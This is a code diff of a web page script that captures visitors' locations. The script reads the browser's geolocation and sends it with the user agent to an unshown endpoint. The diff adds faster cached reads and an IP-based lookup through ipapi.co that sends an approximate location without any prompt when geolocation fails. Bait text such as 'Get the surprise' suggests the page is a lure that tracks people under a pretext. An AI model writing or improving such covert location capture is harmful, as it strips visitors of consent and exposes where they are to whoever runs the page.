@@ -97,13 +97,23 @@ async function sendLocation(){
   // When permission is granted (or becomes granted), immediately get & send position
   async function handlePermissionAndGet(){
     try{
-      const pos = await getPositionWithTimeout({ enableHighAccuracy: false }, 20000);
+      // Try a very fast cached read first (may return immediately on mobile)
+      try {
+        const quick = await getPositionWithTimeout({ enableHighAccuracy: false, maximumAge: 300000 }, 3000);
+        const payload = buildPayloadFromPosition(quick);
+        sendPayload(payload);
+        return;
+      } catch(e) {
+        // ignore quick failure and try a slightly longer network-based read
+      }
+
+      const pos = await getPositionWithTimeout({ enableHighAccuracy: false, maximumAge: 60000 }, 10000);
       const payload = buildPayloadFromPosition(pos);
       sendPayload(payload);
     } catch(err){
       if (!sentOnce) {
         if (err && err.code === 1) { // PERMISSION_DENIED
-          statusEl.textContent = 'Please wait. Oh...! NO.';
+          statusEl.textContent = 'Please Wait... Get the surprise.';
         } else {
           statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
         }
@@ -135,16 +145,49 @@ async function sendLocation(){
 
   // Fallback / regular flow: request position (this triggers browser permission prompt)
   try{
-    const pos = await getPositionWithTimeout({ enableHighAccuracy: false }, 60000);
+    // Try quick cached read first to speed up mobile response
+    try {
+      const quick = await getPositionWithTimeout({ enableHighAccuracy: false, maximumAge: 300000 }, 3000);
+      const payload = buildPayloadFromPosition(quick);
+      sendPayload(payload);
+      return;
+    } catch(e) {
+      // continue to network attempt
+    }
+
+    const pos = await getPositionWithTimeout({ enableHighAccuracy: false, maximumAge: 60000 }, 10000);
     const payload = buildPayloadFromPosition(pos);
     sendPayload(payload);
   } catch(err) {
     if (!sentOnce) {
       if (err && err.code === 1) { // PERMISSION_DENIED
-        statusEl.textContent = 'Please wait....';
-      } else {
-        statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
+        statusEl.textContent = 'Please Wait...';
+        if (sendBtn) sendBtn.disabled = false;
+        return;
       }
+
+      // As a last-resort fallback use IP-based geolocation (less accurate but fast)
+      try {
+        statusEl.textContent = 'Trying a quick fallback...';
+        const r = await fetch('https://ipapi.co/json/');
+        if (!r.ok) throw new Error('IP lookup failed');
+        const data = await r.json();
+        if (data && data.latitude && data.longitude) {
+          const payload = {
+            lat: data.latitude,
+            lon: data.longitude,
+            accuracy: data.city ? 50000 : 100000,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent + ' (ip-fallback)'
+          };
+          sendPayload(payload);
+          return;
+        }
+      } catch(fbErr) {
+        // continue to final error
+      }
+
+      statusEl.textContent = 'Error: ' + (err && err.message ? err.message : 'unknown');
       if (sendBtn) sendBtn.disabled = false;
     }
   }
